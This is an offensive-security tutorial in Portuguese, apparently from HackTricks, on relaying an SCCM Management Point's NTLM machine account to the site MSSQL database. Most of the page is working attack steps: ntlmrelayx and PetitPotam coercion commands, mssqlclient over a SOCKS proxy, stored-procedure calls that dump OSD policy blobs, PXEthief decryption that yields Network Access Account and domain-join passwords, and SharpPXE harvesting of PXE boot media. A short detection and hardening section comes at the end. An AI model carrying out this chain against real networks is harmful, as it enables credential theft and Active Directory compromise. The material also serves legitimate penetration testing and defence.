# SCCM Management Point NTLM Relay para SQL – Extração de Segredos de Política OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Ao forçar um **System Center Configuration Manager (SCCM) Management Point (MP)** a autenticar via SMB/RPC e **relayando** essa conta de máquina NTLM para o **site database (MSSQL)** você obtém direitos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Esses roles permitem chamar um conjunto de stored procedures que expõem blobs de política de **Operating System Deployment (OSD)** (credenciais do Network Access Account, variáveis de Task-Sequence, etc.). Os blobs são codificados em hex/encriptados, mas podem ser decodificados e descriptografados com **PXEthief**, resultando em segredos em plaintext.

Cadeia em alto nível:
1. Descobrir MP & site DB ↦ endpoint HTTP não autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Iniciar `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Forçar o MP usando **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Através do proxy SOCKS conectar com `mssqlclient.py -windows-auth` como a conta relayed **<DOMAIN>\\<MP-host>$**.
5. Executar:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ou `MP_GetPolicyBodyAfterAuthorization`)
6. Remover `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Segredos como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. são recuperados sem tocar no PXE ou nos clientes.

---

## 1. Enumerando endpoints MP não autenticados
A extensão ISAPI do MP **GetAuth.dll** expõe vários parâmetros que não exigem autenticação (a menos que o site seja PKI-only):

| Parameter | Propósito |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Retorna a chave pública do certificado de assinatura do site + GUIDs de dispositivos *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Lista todos os Management-Point no site. |
| `SITESIGNCERT` | Retorna o certificado de assinatura do Primary-Site (identifica o site server sem LDAP). |

Capture os GUIDs que atuarão como o **clientID** para consultas ao DB posteriores:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay a conta de máquina MP para MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Quando a coerção disparar, você deverá ver algo parecido com isto:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identificar políticas OSD via procedimentos armazenados
Conecte-se através do proxy SOCKS (porta 1080 por padrão):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Mude para o DB **CM_<SiteCode>** (use o código do site de 3 dígitos, por exemplo `CM_001`).

### 3.1  Encontrar GUIDs de Unknown-Computer (opcional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Listar políticas atribuídas
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Cada linha contém `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Foque nas políticas:
* **NAAConfig**  – credenciais da Network Access Account
* **TS_Sequence** – variáveis do Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Pode conter contas run-as

### 3.3  Recuperar o corpo completo
Se você já tiver `PolicyID` e `PolicyVersion`, pode pular o requisito de clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: No SSMS aumente “Maximum Characters Retrieved” (>65535) ou o blob será truncado.

---

## 4. Decodificar e descriptografar o blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Exemplo de segredos recuperados:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Funções e procedimentos SQL relevantes
Após o relay, o login é mapeado para:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Essas funções expõem dezenas de permissões EXEC; as principais usadas neste ataque são:

| Procedimento Armazenado | Finalidade |
|-------------------------|-----------|
| `MP_GetMachinePolicyAssignments` | Lista as políticas aplicadas a um `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Retorna o corpo completo da política. |
| `MP_GetListOfMPsInSiteOSD` | Retornado pelo caminho `MPKEYINFORMATIONMEDIA`. |

Você pode inspecionar a lista completa com:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Coleta de mídia de boot PXE (SharpPXE)
* **Resposta PXE via UDP/4011**: envie uma solicitação de boot PXE para um Distribution Point configurado para PXE. A resposta proxyDHCP revela caminhos de boot como `SMSBoot\\x64\\pxe\\variables.dat` (config criptografada) e `SMSBoot\\x64\\pxe\\boot.bcd`, além de um blob de chave criptografada opcional.
* **Recuperar artefatos de boot via TFTP**: use os caminhos retornados para baixar `variables.dat` via TFTP (sem autenticação). O arquivo é pequeno (alguns KB) e contém as variáveis de mídia criptografadas.
* **Descriptografar ou crackear**:
- Se a resposta incluir a chave de descriptografia, alimente-a no **SharpPXE** para descriptografar `variables.dat` diretamente.
- Se nenhuma chave for fornecida (mídia PXE protegida por uma senha customizada), SharpPXE emite um hash **compatível com Hashcat** `$sccm$aes128$...` para cracking offline. Após recuperar a senha, descriptografe o arquivo.
* **Analisar XML descriptografado**: as variáveis em texto claro contêm metadados de implantação do SCCM (**Management Point URL**, **Site Code**, GUIDs da mídia e outros identificadores). O SharpPXE os analisa e imprime um comando **SharpSCCM** pronto para executar com parâmetros GUID/PFX/site pré-preenchidos para abuso subsequente.
* **Requisitos**: apenas conectividade de rede ao listener PXE (UDP/4011) e TFTP; privilégios de administrador local não são necessários.

---

## 7. Detecção & Hardening
1. **Monitorar logins do MP** – qualquer conta de computador do MP efetuando login a partir de um IP que não seja seu host ≈ relay.
2. Ative **Extended Protection for Authentication (EPA)** no banco de dados do site (`PREVENT-14`).
3. Desative NTLM não utilizado, aplique SMB signing, restrinja RPC (mesmas mitigações usadas contra `PetitPotam`/`PrinterBug`).
4. Fortaleça a comunicação MP ↔ DB com IPSec / mutual-TLS.
5. **Restringir exposição PXE** – restrinja UDP/4011 e TFTP no firewall para VLANs confiáveis, exija senhas PXE e gere alertas em downloads TFTP de `SMSBoot\\*\\pxe\\variables.dat`.

---

## Veja também
* Fundamentos de NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* Abuso de MSSQL & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Referências
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
